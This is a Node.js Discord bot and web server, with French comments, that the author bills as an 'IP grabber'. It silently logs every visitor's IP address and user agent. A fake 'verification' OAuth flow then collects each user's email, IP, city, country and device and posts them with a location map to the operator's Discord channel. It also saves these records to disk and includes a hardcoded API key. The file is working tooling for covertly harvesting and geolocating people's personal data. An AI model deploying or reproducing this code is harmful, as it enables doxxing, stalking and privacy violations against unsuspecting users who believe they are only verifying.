/*  
===========================================================
      ✦✦✦  Tous droits réservés @ https://kirosb.fr  ✦✦✦
===========================================================

      ╔════════════════════════════════════════════════╗
      ║   👨‍💻 Développeur : xql.dev                      ║
      ║   🔐 Nom d'utilisateur : a8ke                     ║
      ╚════════════════════════════════════════════════╝

      ╔════════════════════════════════════════════════╗
      ║   🇫🇷 Développeur Français                         ║
      ║   🎬 $elfbot : discord.gg/kirosb                  ║
      ╚════════════════════════════════════════════════╝

➤ Outil de collecte d'IP créé par xql.dev
➤ Contactez-moi pour un nouveau site ;-;

===========================================================
*/

console.log(`
===========================================================
      ✦✦✦  Tous droits réservés @ https://kirosb.fr  ✦✦✦
===========================================================

      ╔════════════════════════════════════════════════╗
      ║   👨‍💻 Développeur : xql.dev                      ║
      ║   🔐 Nom d'utilisateur : a8ke                     ║
      ╚════════════════════════════════════════════════╝

      ╔════════════════════════════════════════════════╗
      ║   🇫🇷 Développeur Français                         ║
      ║   🎬 $elfbot : discord.gg/kirosb                  ║
      ╚════════════════════════════════════════════════╝

➤ Outil de collecte d'IP créé par xql.dev
➤ Contactez-moi pour un nouveau site ;-;

===========================================================
`);

setTimeout(() => {
  console.log(`
██╗  ██╗██╗██████╗  ██████╗      ██████╗ ██████╗  █████╗ ██████╗ ███████╗    ██╗██████╗ 
██║ ██╔╝██║██╔══██╗██╔═══██╗    ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔════╝    ██║██╔══██╗
█████╔╝ ██║██████╔╝██║   ██║    ██║  ███╗██████╔╝███████║██████╔╝███████╗    ██║██████╔╝
██╔═██╗ ██║██╔══██╗██║   ██║    ██║   ██║██╔══██╗██╔══██║██╔══██╗╚════██║    ██║██╔═══╝ 
██║  ██╗██║██║  ██║╚██████╔╝    ╚██████╔╝██║  ██║██║  ██║██████╔╝███████║    ██║██║     
╚═╝  ╚═╝╚═╝╚═╝  ╚═╝ ╚═════╝      ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚══════╝    ╚═╝╚═╝     
                                                                                          
`);
}, 3000);
const express = require('express');
const { Client, EmbedBuilder, SlashCommandBuilder } = require('discord.js');
const axios = require('axios');
const fs = require('fs');
const app = express();
const port = 3048;

const client = new Client({ intents: ['Guilds', 'GuildMembers'] });
const DISCORD_TOKEN = ''; // ton token de bot discord
const CHANNEL_ID = ''; // Ton channel ou ca va envoyer le grabs
const DISCORD_CLIENT_ID = ''; // Ton discord Id bot
const DISCORD_CLIENT_SECRET = ''; // ton discord client secret de ton bot 
const REDIRECT_URI = 'https://api.kirosb.fr/auth/callback'; // change le lien api.kirosb.fr par ton lien genre Imaginon xql.kirosb.fr et dans discord tu va dans la sections OAuth2 add redirects tu add le lien en entier pour moi ducoup cetais ca https://api.kirosb.fr/auth/callback
const GUILD_ID = ''; // Ton Id De guild Qui fais rejoindre

app.use(express.static('public'));
app.use(express.urlencoded({ extended: true }));

if (!fs.existsSync('grabs')) fs.mkdirSync('grabs');
const ipLogFile = 'grabs/ip.json';
if (!fs.existsSync(ipLogFile)) fs.writeFileSync(ipLogFile, '[]');

async function getRealIp(req) {
  let ip = req.headers['x-forwarded-for'] || 
           req.headers['x-real-ip'] || 
           req.headers['cf-connecting-ip'] || 
           req.socket.remoteAddress || 
           req.connection.remoteAddress;

  if (ip && ip.includes('::ffff:')) {
    ip = ip.replace('::ffff:', '');
  }

  if (!ip || ip.includes(':') || !isPublicIp(ip)) {
    try {
      const apiEndpoints = [
        `http://ip-api.com/json/${ip || '8.8.8.8'}`,
        `https://api.ipify.org?format=json`,
        `https://ipinfo.io/json`
      ];
      
      for (const endpoint of apiEndpoints) {
        try {
          const response = await axios.get(endpoint, { timeout: 3000 });
          const fetchedIp = response.data.query || response.data.ip;
          if (isPublicIp(fetchedIp)) {
            return fetchedIp;
          }
        } catch (e) {
          console.error(`Erreur API ${endpoint}:`, e.message);
        }
      }
      return 'Unknown';
    } catch (e) {
      console.error('Erreur récupération IP:', e.message);
      return 'Unknown';
    }
  }

  return ip || 'Unknown';
}

function isPublicIp(ip) {
  if (!ip) return false;
  const privateRanges = [
    /^0\./, /^10\./, /^100\.(6[4-9]|[7-9][0-9]|1[0-1][0-9]|12[0-7])\./,
    /^127\./, /^169\.254\./, /^172\.(1[6-9]|2[0-9]|3[0-1])\./,
    /^192\.168\./, /^fc00:/, /^fe80:/, /^::1$/
  ];
  return !privateRanges.some(range => range.test(ip)) && /^(\d{1,3}\.){3}\d{1,3}$/.test(ip);
}

async function logVisit(req) {
  const ip = await getRealIp(req);
  const userAgent = req.headers['user-agent'] || 'Unknown';
  const timestamp = new Date().toISOString();
  const visitData = { timestamp, ip, userAgent };

  let logs = [];
  try {
    const data = fs.readFileSync(ipLogFile);
    logs = Array.isArray(JSON.parse(data.length ? data : '[]')) ? JSON.parse(data.length ? data : '[]') : [];
  } catch (e) {
    console.error('Erreur lecture ip.json:', e);
    logs = [];
  }

  if (!logs.some(log => log.ip === ip)) {
    logs.push(visitData);
    fs.writeFileSync(ipLogFile, JSON.stringify(logs, null, 2));
  }
}

app.use(async (req, res, next) => {
  await logVisit(req);
  next();
});

client.once('ready', () => {
  const joinCommand = new SlashCommandBuilder()
    .setName('join')
    .setDescription('Rejoins le serveur Discord avec un lien personnalisé')
    .addStringOption(option =>
      option.setName('invite')
        .setDescription('Lien d\'invitation au serveur')
        .setRequired(true));
  client.application.commands.create(joinCommand);
});

app.get('/', (req, res) => {
  res.sendFile(__dirname + '/public/index.html');
});

app.get('/auth/discord', (req, res) => {
  const scope = 'identify email';
  const url = `https://discord.com/api/oauth2/authorize?client_id=${DISCORD_CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=${scope}`;
  res.redirect(url);
});

app.get('/auth/callback', async (req, res) => {
  const code = req.query.code;
  if (!code) {
    res.redirect('/');
    return;
  }

  try {
    const tokenResponse = await axios.post('https://discord.com/api/oauth2/token', {
      client_id: DISCORD_CLIENT_ID,
      client_secret: DISCORD_CLIENT_SECRET,
      grant_type: 'authorization_code',
      code: code,
      redirect_uri: REDIRECT_URI
    }, { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });

    const accessToken = tokenResponse.data.access_token;
    const userResponse = await axios.get('https://discord.com/api/users/@me', {
      headers: { Authorization: `Bearer ${accessToken}` }
    });

    const ip = await getRealIp(req);
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const deviceType = /mobile/i.test(userAgent) ? 'Mobile' : /tablet/i.test(userAgent) ? 'Tablet' : 'Desktop';
    const geoResponse = await axios.get(`http://ip-api.com/json/${ip === 'Unknown' ? '8.8.8.8' : ip}`);
    const avatarUrl = `https://cdn.discordapp.com/avatars/${userResponse.data.id}/${userResponse.data.avatar}.png`;

    const city = geoResponse.data.city || geoResponse.data.regionName || 'Unknown';
    const mapUrl = `https://www.mapquestapi.com/staticmap/v5/map?center=${geoResponse.data.lat},${geoResponse.data.lon}&zoom=12&size=400,300&type=map&locations=${geoResponse.data.lat},${geoResponse.data.lon}|marker-lg-FF0000-1&key=bc490a2219d6cf457c92b219600f835b`;

    let badges = [];
    const flags = userResponse.data.flags || 0;
    if (flags & 1 << 0) badges.push('Discord Employee');
    if (flags & 1 << 1) badges.push('Partnered Server Owner');
    if (flags & 1 << 2) badges.push('HypeSquad Events');
    if (flags & 1 << 3) badges.push('Bug Hunter Level 1');
    if (flags & 1 << 6) badges.push('House Bravery');
    if (flags & 1 << 7) badges.push('House Brilliance');
    if (flags & 1 << 8) badges.push('House Balance');
    if (flags & 1 << 9) badges.push('Early Supporter');
    if (flags & 1 << 10) badges.push('Team User');
    if (flags & 1 << 12) badges.push('Bug Hunter Level 2');
    if (flags & 1 << 14) badges.push('Verified Bot');
    if (flags & 1 << 16) badges.push('Early Verified Bot Developer');
    if (flags & 1 << 17) badges.push('Certified Moderator');
    const badgesText = badges.length > 0 ? badges.join(', ') : 'None';

    const embed = new EmbedBuilder()
      .setTitle('🌟 Vérification Réussie 🌟')
      .setColor('#5865F2')
      .setThumbnail(avatarUrl)
      .addFields(
        { name: '👤 User', value: `<@${userResponse.data.id}>`, inline: true },
        { name: '🆔 ID', value: userResponse.data.id, inline: true },
        { name: '📧 Email', value: `\`\`\`${userResponse.data.email}\`\`\` verified: true`, inline: false },
        { name: '📍 IP', value: `\`\`\`${ip}\`\`\` (Device: ${deviceType})`, inline: false },
        { name: '🌐 Location', value: `City: ${city}, Country: ${geoResponse.data.country}`, inline: false },
        { name: '🏅 Badges', value: `Badges: ${badgesText}`, inline: false }
      )
      .setImage(mapUrl)
      .setFooter({ text: 'Bienvenue sur Kiro$B', value: 'None' });

    const channel = client.channels.cache.get(CHANNEL_ID);
    if (channel) channel.send({ embeds: [embed] });

    const userFile = `grabs/verif_${userResponse.data.id}.json`;
    let userData = {};
    if (fs.existsSync(userFile)) {
      userData = JSON.parse(fs.readFileSync(userFile));
    }
    userData = {
      ...userData,
      [Date.now()]: {
        timestamp: new Date().toISOString(),
        user: userResponse.data.username,
        id: userResponse.data.id,
        email: userResponse.data.email,
        ip: ip,
        location: geoResponse.data,
        browser: userAgent,
        badges: badgesText
      }
    };
    fs.writeFileSync(userFile, JSON.stringify(userData, null, 2));

    let verifiedUsers = [];
    const verifiedUsersFile = 'grabs/verified_users.json';
    if (fs.existsSync(verifiedUsersFile)) {
      verifiedUsers = JSON.parse(fs.readFileSync(verifiedUsersFile));
    }
    if (!verifiedUsers.includes(userResponse.data.id)) {
      verifiedUsers.push(userResponse.data.id);
      fs.writeFileSync(verifiedUsersFile, JSON.stringify(verifiedUsers, null, 2));
    }

    res.redirect('/?verified=true');
  } catch (error) {
    console.error('Erreur:', error.response ? error.response.data : error.message);
    res.redirect('/');
  }
});

client.on('interactionCreate', async interaction => {
  if (!interaction.isCommand()) return;
  if (interaction.commandName === 'join') {
    const inviteLink = interaction.options.getString('invite');
    await interaction.reply({ content: `Rejoins le serveur officiel ici : ${inviteLink}`, ephemeral: true });
    const verifiedUsersFile = 'grabs/verified_users.json';
    if (fs.existsSync(verifiedUsersFile)) {
      const verifiedUsers = JSON.parse(fs.readFileSync(verifiedUsersFile));
      const guild = client.guilds.cache.get(GUILD_ID);
      if (guild) {
        verifiedUsers.forEach(async userId => {
          try {
            await guild.members.add(userId, { accessToken: null, nick: null, roles: [], reason: 'Vérifié via site' });
          } catch (error) {
            console.error(`Erreur ajout utilisateur ${userId}:`, error);
          }
        });
      } else {
        console.error('Guild non trouvée avec l\'ID:', GUILD_ID);
      }
    }
  }
});

app.listen(port, () => console.log(``));
client.login(DISCORD_TOKEN);

/*  
===========================================================
      ✦✦✦  All rights reserved @ https://kirosb.fr  ✦✦✦
===========================================================

      ╔════════════════════════════════════════════════╗
      ║   👨‍💻 Developer : xql.dev                       ║
      ║   🔐 Username  : a8ke                            ║
      ╚════════════════════════════════════════════════╝

      ╔════════════════════════════════════════════════╗
      ║   🇫🇷 French Developer                            ║
      ║   🎬 $elfbot : discord.gg/kirosb                 ║
      ╚════════════════════════════════════════════════╝

➤ IP grabber created by xql.dev
➤ Contact me for a new website ;-;

===========================================================
*/
